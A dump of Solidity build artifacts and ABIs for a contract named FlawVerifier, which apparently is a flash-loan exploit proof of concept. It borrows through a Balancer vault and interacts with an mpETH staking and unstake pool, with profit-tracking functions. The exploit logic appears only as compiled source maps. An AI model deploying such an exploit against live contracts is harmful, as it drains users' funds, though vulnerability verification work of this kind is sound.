er\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"FlawVerifier.sol\":\"ILiquidUnstakePoolLike\"},\"evmVersion\":\"prague\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"FlawVerifier.sol\":{\"keccak256\":\"0x7cbadc432ceb7c0057b5ce4297c56138761a09defa3bab98eb3ac00d72f44f27\",\"license\":\"UNLICENSED\",\"urls\":[\"bzz-raw://c130d5b68e6123f6a6fccfaf75db7143ba9820a1d6a3e09aac0071dae1fb3e15\",\"dweb:/ipfs/QmTQjJ4iDcqZDf635FSYiGfPPRUa4S8YMnvJvC7bg7mnjs\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.30+commit.73712a01"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"}],"stateMutability":"view","type":"function","name":"getAmountOut","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"},{"internalType":"uint256","name":"feeAmount","type":"uint256"}]},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"minOut","type":"uint256"}],"stateMutability":"nonpayable","type":"function","name":"swapmpETHforETH","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}]}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":[],"optimizer":{"enabled":false,"runs":200},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"FlawVerifier.sol":"ILiquidUnstakePoolLike"},"evmVersion":"prague","libraries":{}},"sources":{"FlawVerifier.sol":{"keccak256":"0x7cbadc432ceb7c0057b5ce4297c56138761a09defa3bab98eb3ac00d72f44f27","urls":["bzz-raw://c130d5b68e6123f6a6fccfaf75db7143ba9820a1d6a3e09aac0071dae1fb3e15","dweb:/ipfs/QmTQjJ4iDcqZDf635FSYiGfPPRUa4S8YMnvJvC7bg7mnjs"],"license":"UNLICENSED"}},"version":1},"id":0}
+../src/FlawVerifier.sol:52:contract FlawVerifier is IFlashLoanRecipient {
+../src/FlawVerifier.sol:170:    function profitToken() external view returns (address) {
+../src/FlawVerifier.sol:174:    function profitAmount() external view returns (uint256) {
+../src/cache/solidity-files-cache.json:1:{"_format":"","paths":{"artifacts":"out","build_infos":"out/build-info","sources":"src","tests":"test","scripts":"script","libraries":["lib"]},"files":{"FlawVerifier.sol":{"lastModificationDate":1778590887513,"contentHash":"d9efe7242c64064a","interfaceReprHash":null,"sourceName":"FlawVerifier.sol","imports":[],"versionRequirement":"^0.8.20","artifacts":{"FlawVerifier":{"0.8.30":{"default":{"path":"FlawVerifier.sol/FlawVerifier.json","build_id":"cb60d90bb60f1e5d"}}},"ForceEther":{"0.8.30":{"default":{"path":"FlawVerifier.sol/ForceEther.json","build_id":"cb60d90bb60f1e5d"}}},"IBalancerVault":{"0.8.30":{"default":{"path":"FlawVerifier.sol/IBalancerVault.json","build_id":"cb60d90bb60f1e5d"}}},"IERC20Like":{"0.8.30":{"default":{"path":"FlawVerifier.sol/IERC20Like.json","build_id":"cb60d90bb60f1e5d"}}},"IFlashLoanRecipient":{"0.8.30":{"default":{"path":"FlawVerifier.sol/IFlashLoanRecipient.json","build_id":"cb60d90bb60f1e5d"}}},"ILiquidUnstakePoolLike":{"0.8.30":{"default":{"path":"FlawVerifier.sol/ILiquidUnstakePoolLike.json","build_id":"cb60d90bb60f1e5d"}}},"IStakingLike":{"0.8.30":{"default":{"path":"FlawVerifier.sol/IStakingLike.json","build_id":"cb60d90bb60f1e5d"}}},"IWETH":{"0.8.30":{"default":{"path":"FlawVerifier.sol/IWETH.json","build_id":"cb60d90bb60f1e5d"}}}},"seenByCompiler":true}},"builds":["cb60d90bb60f1e5d"],"profiles":{"default":{"solc":{"optimizer":{"enabled":false,"runs":200},"metadata":{"useLiteralContent":false,"bytecodeHash":"ipfs","appendCBOR":true},"outputSelection":{"*":{"*":["abi","evm.bytecode.object","evm.bytecode.sourceMap","evm.bytecode.linkReferences","evm.deployedBytecode.object","evm.deployedBytecode.sourceMap","evm.deployedBytecode.linkReferences","evm.deployedBytecode.immutableReferences","evm.methodIdentifiers","metadata"]}},"evmVersion":"prague","viaIR":false,"libraries":{}},"vyper":{"evmVersion":"prague","outputSelection":{"*":{"*":["abi","evm.bytecode","evm.deployedBytecode"]}}}}},"preprocessed":false,"mocks":[]}
+../src/out/FlawVerifier.sol/IBalancerVault.json:1:{"abi":[{"type":"function","name":"flashLoan","inputs":[{"name":"recipient","type":"address","internalType":"contract IFlashLoanRecipient"},{"name":"tokens","type":"address[]","internalType":"contract IERC20Like[]"},{"name":"amounts","type":"uint256[]","internalType":"uint256[]"},{"name":"userData","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x","sourceMap":"","linkReferences":{}},"deployedBytecode":{"object":"0x","sourceMap":"","linkReferences":{}},"methodIdentifiers":{"flashLoan(address,address[],uint256[],bytes)":"5c38449e"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.30+commit.73712a01\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"contract IFlashLoanRecipient\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"contract IERC20Like[]\",\"name\":\"tokens\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"amounts\",\"type\":\"uint256[]\"},{\"internalType\":\"bytes\",\"name\":\"userData\",\"type\":\"bytes\"}],\"name\":\"flashLoan\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"FlawVerifier.sol\":\"IBalancerVault\"},\"evmVersion\":\"prague\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"FlawVerifier.sol\":{\"keccak256\":\"0x7cbadc432ceb7c0057b5ce4297c56138761a09defa3bab98eb3ac00d72f44f27\",\"license\":\"UNLICENSED\",\"urls\":[\"bzz-raw://c130d5b68e6123f6a6fccfaf75db7143ba9820a1d6a3e09aac0071dae1fb3e15\",\"dweb:/ipfs/QmTQjJ4iDcqZDf635FSYiGfPPRUa4S8YMnvJvC7bg7mnjs\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.30+commit.73712a01"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"contract IFlashLoanRecipient","name":"recipient","type":"address"},{"internalType":"contract IERC20Like[]","name":"tokens","type":"address[]"},{"internalType":"uint256[]","name":"amounts","type":"uint256[]"},{"internalType":"bytes","name":"userData","type":"bytes"}],"stateMutability":"nonpayable","type":"function","name":"flashLoan"}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":[],"optimizer":{"enabled":false,"runs":200},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"FlawVerifier.sol":"IBalancerVault"},"evmVersion":"prague","libraries":{}},"sources":{"FlawVerifier.sol":{"keccak256":"0x7cbadc432ceb7c0057b5ce4297c56138761a09defa3bab98eb3ac00d72f44f27","urls":["bzz-raw://c130d5b68e6123f6a6fccfaf75db7143ba9820a1d6a3e09aac0071dae1fb3e15","dweb:/ipfs/QmTQjJ4iDcqZDf635FSYiGfPPRUa4S8YMnvJvC7bg7mnjs"],"license":"UNLICENSED"}},"version":1},"id":0}
+../src/out/FlawVerifier.sol/IWETH.json:1:{"abi":[{"type":"function","name":"approve","inputs":[{"name":"spender","type":"address","internalType":"address"},{"name":"amount","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"},{"type":"function","name":"balanceOf","inputs":[{"name":"account","type":"address","internalType":"address"}],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"deposit","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"transfer","inputs":[{"name":"to","type":"address","internalType":"address"},{"name":"amount","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"},{"type":"function","name":"withdraw","inputs":[{"name":"amount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x","sourceMap":"","linkReferences":{}},"deployedBytecode":{"object":"0x","sourceMap":"","linkReferences":{}},"methodIdentifiers":{"approve(address,uint256)":"095ea7b3","balanceOf(address)":"70a08231","deposit()":"d0e30db0","transfer(address,uint256)":"a9059cbb","withdraw(uint256)":"2e1a7d4d"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.30+commit.73712a01\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"FlawVerifier.sol\":\"IWETH\"},\"evmVersion\":\"prague\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"FlawVerifier.sol\":{\"keccak256\":\"0x7cbadc432ceb7c0057b5ce4297c56138761a09defa3bab98eb3ac00d72f44f27\",\"license\":\"UNLICENSED\",\"urls\":[\"bzz-raw://c130d5b68e6123f6a6fccfaf75db7143ba9820a1d6a3e09aac0071dae1fb3e15\",\"dweb:/ipfs/QmTQjJ4iDcqZDf635FSYiGfPPRUa4S8YMnvJvC7bg7mnjs\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.30+commit.73712a01"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"stateMutability":"nonpayable","type":"function","name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"stateMutability":"view","type":"function","name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"payable","type":"function","name":"deposit"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"stateMutability":"nonpayable","type":"function","name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"stateMutability":"nonpayable","type":"function","name":"withdraw"}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":[],"optimizer":{"enabled":false,"runs":200},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"FlawVerifier.sol":"IWETH"},"evmVersion":"prague","libraries":{}},"sources":{"FlawVerifier.sol":{"keccak256":"0x7cbadc432ceb7c0057b5ce4297c56138761a09defa3bab98eb3ac00d72f44f27","urls":["bzz-raw://c130d5b68e6123f6a6fccfaf75db7143ba9820a1d6a3e09aac0071dae1fb3e15","dweb:/ipfs/QmTQjJ4iDcqZDf635FSYiGfPPRUa4S8YMnvJvC7bg7mnjs"],"license":"UNLICENSED"}},"version":1},"id":0}
+../src/out/FlawVerifier.sol/IStakingLike.json:1:{"abi":[{"type":"function","name":"approve","inputs":[{"name":"spender","type":"address","internalType":"address"},{"name":"amount","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"},{"type":"function","name":"balanceOf","inputs":[{"name":"account","type":"address","internalType":"address"}],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"liquidUnstakePool","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"mint","inputs":[{"name":"shares","type":"uint256","internalType":"uint256"},{"name":"receiver","type":"address","internalType":"address"}],"outputs":[{"name":"assets","type":"uint256","internalType":"uint256"}],"stateMutability":"nonpayable"},{"type":"function","name":"previewMint","inputs":[{"name":"shares","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"assets","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"transfer","inputs":[{"name":"to","type":"address","internalType":"address"},{"name":"amount","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x","sourceMap":"","linkReferences":{}},"deployedBytecode":{"object":"0x","sourceMap":"","linkReferences":{}},"methodIdentifiers":{"approve(address,uint256)":"095ea7b3","balanceOf(address)":"70a08231","liquidUnstakePool()":"9dc162ca","mint(uint256,address)":"94bf804d","previewMint(uint256)":"b3d7f6b9","transfer(address,uint256)":"a9059cbb"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.30+commit.73712a01\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidUnstakePool\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shares\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"mint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"assets\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"funct…15942 tokens truncated…796:156::-;3886:41;3921:5;3886:41;:::i;:::-;3879:5;3876:52;3866:80;;3942:1;3939;3932:12;3866:80;3796:156;:::o;3958:173::-;4021:5;4059:6;4046:20;4037:29;;4075:50;4119:5;4075:50;:::i;:::-;3958:173;;;;:::o;4166:761::-;4279:5;4304:98;4320:81;4394:6;4320:81;:::i;:::-;4304:98;:::i;:::-;4295:107;;4422:5;4451:6;4444:5;4437:21;4485:4;4478:5;4474:16;4467:23;;4538:4;4530:6;4526:17;4518:6;4514:30;4567:3;4559:6;4556:15;4553:122;;;4586:79;;:::i;:::-;4553:122;4701:6;4684:237;4718:6;4713:3;4710:15;4684:237;;;4793:3;4822:54;4872:3;4860:10;4822:54;:::i;:::-;4817:3;4810:67;4906:4;4901:3;4897:14;4890:21;;4760:161;4744:4;4739:3;4735:14;4728:21;;4684:237;;;4688:21;4285:642;;4166:761;;;;;:::o;4962:404::-;5050:5;5099:3;5092:4;5084:6;5080:17;5076:27;5066:122;;5107:79;;:::i;:::-;5066:122;5224:6;5211:20;5249:111;5356:3;5348:6;5341:4;5333:6;5329:17;5249:111;:::i;:::-;5240:120;;5056:310;4962:404;;;;:::o;5372:311::-;5449:4;5539:18;5531:6;5528:30;5525:56;;;5561:18;;:::i;:::-;5525:56;5611:4;5603:6;5599:17;5591:25;;5671:4;5665;5661:15;5653:23;;5372:311;;;:::o;5706:710::-;5802:5;5827:81;5843:64;5900:6;5843:64;:::i;:::-;5827:81;:::i;:::-;5818:90;;5928:5;5957:6;5950:5;5943:21;5991:4;5984:5;5980:16;5973:23;;6044:4;6036:6;6032:17;6024:6;6020:30;6073:3;6065:6;6062:15;6059:122;;;6092:79;;:::i;:::-;6059:122;6207:6;6190:220;6224:6;6219:3;6216:15;6190:220;;;6299:3;6328:37;6361:3;6349:10;6328:37;:::i;:::-;6323:3;6316:50;6395:4;6390:3;6386:14;6379:21;;6266:144;6250:4;6245:3;6241:14;6234:21;;6190:220;;;6194:21;5808:608;;5706:710;;;;;:::o;6439:370::-;6510:5;6559:3;6552:4;6544:6;6540:17;6536:27;6526:122;;6567:79;;:::i;:::-;6526:122;6684:6;6671:20;6709:94;6799:3;6791:6;6784:4;6776:6;6772:17;6709:94;:::i;:::-;6700:103;;6516:293;6439:370;;;;:::o;6815:117::-;6924:1;6921;6914:12;6938:307;6999:4;7089:18;7081:6;7078:30;7075:56;;;7111:18;;:::i;:::-;7075:56;7149:29;7171:6;7149:29;:::i;:::-;7141:37;;7233:4;7227;7223:15;7215:23;;6938:307;;;:::o;7251:148::-;7349:6;7344:3;7339;7326:30;7390:1;7381:6;7376:3;7372:16;7365:27;7251:148;;;:::o;7405:423::-;7482:5;7507:65;7523:48;7564:6;7523:48;:::i;:::-;7507:65;:::i;:::-;7498:74;;7595:6;7588:5;7581:21;7633:4;7626:5;7622:16;7671:3;7662:6;7657:3;7653:16;7650:25;7647:112;;;7678:79;;:::i;:::-;7647:112;7768:54;7815:6;7810:3;7805;7768:54;:::i;:::-;7488:340;7405:423;;;;;:::o;7847:338::-;7902:5;7951:3;7944:4;7936:6;7932:17;7928:27;7918:122;;7959:79;;:::i;:::-;7918:122;8076:6;8063:20;8101:78;8175:3;8167:6;8160:4;8152:6;8148:17;8101:78;:::i;:::-;8092:87;;7908:277;7847:338;;;;:::o;8191:1607::-;8378:6;8386;8394;8402;8451:3;8439:9;8430:7;8426:23;8422:33;8419:120;;;8458:79;;:::i;:::-;8419:120;8606:1;8595:9;8591:17;8578:31;8636:18;8628:6;8625:30;8622:117;;;8658:79;;:::i;:::-;8622:117;8763:95;8850:7;8841:6;8830:9;8826:22;8763:95;:::i;:::-;8753:105;;8549:319;8935:2;8924:9;8920:18;8907:32;8966:18;8958:6;8955:30;8952:117;;;8988:79;;:::i;:::-;8952:117;9093:78;9163:7;9154:6;9143:9;9139:22;9093:78;:::i;:::-;9083:88;;8878:303;9248:2;9237:9;9233:18;9220:32;9279:18;9271:6;9268:30;9265:117;;;9301:79;;:::i;:::-;9265:117;9406:78;9476:7;9467:6;9456:9;9452:22;9406:78;:::i;:::-;9396:88;;9191:303;9561:2;9550:9;9546:18;9533:32;9592:18;9584:6;9581:30;9578:117;;;9614:79;;:::i;:::-;9578:117;9719:62;9773:7;9764:6;9753:9;9749:22;9719:62;:::i;:::-;9709:72;;9504:287;8191:1607;;;;;;;:::o;9804:169::-;9888:11;9922:6;9917:3;9910:19;9962:4;9957:3;9953:14;9938:29;;9804:169;;;;:::o;9979:164::-;10119:16;10115:1;10107:6;10103:14;10096:40;9979:164;:::o;10149:366::-;10291:3;10312:67;10376:2;10371:3;10312:67;:::i;:::-;10305:74;;10388:93;10477:3;10388:93;:::i;:::-;10506:2;10501:3;10497:12;10490:19;;10149:366;;;:::o;10521:419::-;10687:4;10725:2;10714:9;10710:18;10702:26;;10774:9;10768:4;10764:20;10760:1;10749:9;10745:17;10738:47;10802:131;10928:4;10802:131;:::i;:::-;10794:139;;10521:419;;;:::o;10946:180::-;10994:77;10991:1;10984:88;11091:4;11088:1;11081:15;11115:4;11112:1;11105:15;11132:332;11253:4;11291:2;11280:9;11276:18;11268:26;;11304:71;11372:1;11361:9;11357:17;11348:6;11304:71;:::i;:::-;11385:72;11453:2;11442:9;11438:18;11429:6;11385:72;:::i;:::-;11132:332;;;;;:::o;11470:60::-;11498:3;11519:5;11512:12;;11470:60;;;:::o;11536:142::-;11586:9;11619:53;11637:34;11646:24;11664:5;11646:24;:::i;:::-;11637:34;:::i;:::-;11619:53;:::i;:::-;11606:66;;11536:142;;;:::o;11684:126::-;11734:9;11767:37;11798:5;11767:37;:::i;:::-;11754:50;;11684:126;;;:::o;11816:147::-;11887:9;11920:37;11951:5;11920:37;:::i;:::-;11907:50;;11816:147;;;:::o;11969:173::-;12077:58;12129:5;12077:58;:::i;:::-;12072:3;12065:71;11969:173;;:::o;12148:131::-;12232:6;12266:5;12260:12;12250:22;;12148:131;;;:::o;12285:184::-;12384:11;12418:6;12413:3;12406:19;12458:4;12453:3;12449:14;12434:29;;12285:184;;;;:::o;12475:149::-;12559:4;12582:3;12574:11;;12612:4;12607:3;12603:14;12595:22;;12475:149;;;:::o;12630:143::-;12697:9;12730:37;12761:5;12730:37;:::i;:::-;12717:50;;12630:143;;;:::o;12779:155::-;12873:54;12921:5;12873:54;:::i;:::-;12868:3;12861:67;12779:155;;:::o;12940:213::-;13026:10;13047:63;13106:3;13098:6;13047:63;:::i;:::-;13142:4;13137:3;13133:14;13119:28;;12940:213;;;;:::o;13159:130::-;13246:4;13278;13273:3;13269:14;13261:22;;13159:130;;;:::o;13337:817::-;13473:3;13502:71;13567:5;13502:71;:::i;:::-;13589:86;13668:6;13663:3;13589:86;:::i;:::-;13582:93;;13699:73;13766:5;13699:73;:::i;:::-;13795:7;13826:1;13811:318;13836:6;13833:1;13830:13;13811:318;;;13912:6;13906:13;13939:80;14015:3;14000:13;13939:80;:::i;:::-;13932:87;;14042:77;14112:6;14042:77;:::i;:::-;14032:87;;13871:258;13858:1;13855;13851:9;13846:14;;13811:318;;;13815:14;14145:3;14138:10;;13478:676;;;13337:817;;;;:::o;14160:114::-;14227:6;14261:5;14255:12;14245:22;;14160:114;;;:::o;14280:184::-;14379:11;14413:6;14408:3;14401:19;14453:4;14448:3;14444:14;14429:29;;14280:184;;;;:::o;14470:132::-;14537:4;14560:3;14552:11;;14590:4;14585:3;14581:14;14573:22;;14470:132;;;:::o;14608:108::-;14685:24;14703:5;14685:24;:::i;:::-;14680:3;14673:37;14608:108;;:::o;14722:179::-;14791:10;14812:46;14854:3;14846:6;14812:46;:::i;:::-;14890:4;14885:3;14881:14;14867:28;;14722:179;;;;:::o;14907:113::-;14977:4;15009;15004:3;15000:14;14992:22;;14907:113;;;:::o;15056:732::-;15175:3;15204:54;15252:5;15204:54;:::i;:::-;15274:86;15353:6;15348:3;15274:86;:::i;:::-;15267:93;;15384:56;15434:5;15384:56;:::i;:::-;15463:7;15494:1;15479:284;15504:6;15501:1;15498:13;15479:284;;;15580:6;15574:13;15607:63;15666:3;15651:13;15607:63;:::i;:::-;15600:70;;15693:60;15746:6;15693:60;:::i;:::-;15683:70;;15539:224;15526:1;15523;15519:9;15514:14;;15479:284;;;15483:14;15779:3;15772:10;;15180:608;;;15056:732;;;;:::o;15794:98::-;15845:6;15879:5;15873:12;15863:22;;15794:98;;;:::o;15898:168::-;15981:11;16015:6;16010:3;16003:19;16055:4;16050:3;16046:14;16031:29;;15898:168;;;;:::o;16072:139::-;16161:6;16156:3;16151;16145:23;16202:1;16193:6;16188:3;16184:16;16177:27;16072:139;;;:::o;16217:373::-;16303:3;16331:38;16363:5;16331:38;:::i;:::-;16385:70;16448:6;16443:3;16385:70;:::i;:::-;16378:77;;16464:65;16522:6;16517:3;16510:4;16503:5;16499:16;16464:65;:::i;:::-;16554:29;16576:6;16554:29;:::i;:::-;16549:3;16545:39;16538:46;;16307:283;16217:373;;;;:::o;16596:1018::-;16929:4;16967:3;16956:9;16952:19;16944:27;;16981:92;17070:1;17059:9;17055:17;17046:6;16981:92;:::i;:::-;17120:9;17114:4;17110:20;17105:2;17094:9;17090:18;17083:48;17148:125;17268:4;17259:6;17148:125;:::i;:::-;17140:133;;17320:9;17314:4;17310:20;17305:2;17294:9;17290:18;17283:48;17348:108;17451:4;17442:6;17348:108;:::i;:::-;17340:116;;17503:9;17497:4;17493:20;17488:2;17477:9;17473:18;17466:48;17531:76;17602:4;17593:6;17531:76;:::i;:::-;17523:84;;16596:1018;;;;;;;:::o;17620:143::-;17677:5;17708:6;17702:13;17693:22;;17724:33;17751:5;17724:33;:::i;:::-;17620:143;;;;:::o;17769:351::-;17839:6;17888:2;17876:9;17867:7;17863:23;17859:32;17856:119;;;17894:79;;:::i;:::-;17856:119;18014:1;18039:64;18095:7;18086:6;18075:9;18071:22;18039:64;:::i;:::-;18029:74;;17985:128;17769:351;;;;:::o;18126:220::-;18266:34;18262:1;18254:6;18250:14;18243:58;18335:3;18330:2;18322:6;18318:15;18311:28;18126:220;:::o;18352:366::-;18494:3;18515:67;18579:2;18574:3;18515:67;:::i;:::-;18508:74;;18591:93;18680:3;18591:93;:::i;:::-;18709:2;18704:3;18700:12;18693:19;;18352:366;;;:::o;18724:419::-;18890:4;18928:2;18917:9;18913:18;18905:26;;18977:9;18971:4;18967:20;18963:1;18952:9;18948:17;18941:47;19005:131;19131:4;19005:131;:::i;:::-;18997:139;;18724:419;;;:::o;19149:221::-;19289:34;19285:1;19277:6;19273:14;19266:58;19358:4;19353:2;19345:6;19341:15;19334:29;19149:221;:::o;19376:366::-;19518:3;19539:67;19603:2;19598:3;19539:67;:::i;:::-;19532:74;;19615:93;19704:3;19615:93;:::i;:::-;19733:2;19728:3;19724:12;19717:19;;19376:366;;;:::o;19748:419::-;19914:4;19952:2;19941:9;19937:18;19929:26;;20001:9;19995:4;19991:20;19987:1;19976:9;19972:17;19965:47;20029:131;20155:4;20029:131;:::i;:::-;20021:139;;19748:419;;;:::o;20173:230::-;20313:34;20309:1;20301:6;20297:14;20290:58;20382:13;20377:2;20369:6;20365:15;20358:38;20173:230;:::o;20409:366::-;20551:3;20572:67;20636:2;20631:3;20572:67;:::i;:::-;20565:74;;20648:93;20737:3;20648:93;:::i;:::-;20766:2;20761:3;20757:12;20750:19;;20409:366;;;:::o;20781:419::-;20947:4;20985:2;20974:9;20970:18;20962:26;;21034:9;21028:4;21024:20;21020:1;21009:9;21005:17;20998:47;21062:131;21188:4;21062:131;:::i;:::-;21054:139;;20781:419;;;:::o;21206:180::-;21254:77;21251:1;21244:88;21351:4;21348:1;21341:15;21375:4;21372:1;21365:15;21392:410;21432:7;21455:20;21473:1;21455:20;:::i;:::-;21450:25;;21489:20;21507:1;21489:20;:::i;:::-;21484:25;;21544:1;21541;21537:9;21566:30;21584:11;21566:30;:::i;:::-;21555:41;;21745:1;21736:7;21732:15;21729:1;21726:22;21706:1;21699:9;21679:83;21656:139;;21775:18;;:::i;:::-;21656:139;21440:362;21392:410;;;;:::o;21808:180::-;21856:77;21853:1;21846:88;21953:4;21950:1;21943:15;21977:4;21974:1;21967:15;21994:185;22034:1;22051:20;22069:1;22051:20;:::i;:::-;22046:25;;22085:20;22103:1;22085:20;:::i;:::-;22080:25;;22124:1;22114:35;;22129:18;;:::i;:::-;22114:35;22171:1;22168;22164:9;22159:14;;21994:185;;;;:::o;22185:227::-;22325:34;22321:1;22313:6;22309:14;22302:58;22394:10;22389:2;22381:6;22377:15;22370:35;22185:227;:::o;22418:366::-;22560:3;22581:67;22645:2;22640:3;22581:67;:::i;:::-;22574:74;;22657:93;22746:3;22657:93;:::i;:::-;22775:2;22770:3;22766:12;22759:19;;22418:366;;;:::o;22790:419::-;22956:4;22994:2;22983:9;22979:18;22971:26;;23043:9;23037:4;23033:20;23029:1;23018:9;23014:17;23007:47;23071:131;23197:4;23071:131;:::i;:::-;23063:139;;22790:419;;;:::o;23215:194::-;23255:4;23275:20;23293:1;23275:20;:::i;:::-;23270:25;;23309:20;23327:1;23309:20;:::i;:::-;23304:25;;23353:1;23350;23346:9;23338:17;;23377:1;23371:4;23368:11;23365:37;;;23382:18;;:::i;:::-;23365:37;23215:194;;;;:::o;23415:180::-;23555:32;23551:1;23543:6;23539:14;23532:56;23415:180;:::o;23601:366::-;23743:3;23764:67;23828:2;23823:3;23764:67;:::i;:::-;23757:74;;23840:93;23929:3;23840:93;:::i;:::-;23958:2;23953:3;23949:12;23942:19;;23601:366;;;:::o;23973:419::-;24139:4;24177:2;24166:9;24162:18;24154:26;;24226:9;24220:4;24216:20;24212:1;24201:9;24197:17;24190:47;24254:131;24380:4;24254:131;:::i;:::-;24246:139;;23973:419;;;:::o;24398:181::-;24538:33;24534:1;24526:6;24522:14;24515:57;24398:181;:::o;24585:366::-;24727:3;24748:67;24812:2;24807:3;24748:67;:::i;:::-;24741:74;;24824:93;24913:3;24824:93;:::i;:::-;24942:2;24937:3;24933:12;24926:19;;24585:366;;;:::o;24957:419::-;25123:4;25161:2;25150:9;25146:18;25138:26;;25210:9;25204:4;25200:20;25196:1;25185:9;25181:17;25174:47;25238:131;25364:4;25238:131;:::i;:::-;25230:139;;24957:419;;;:::o;25382:176: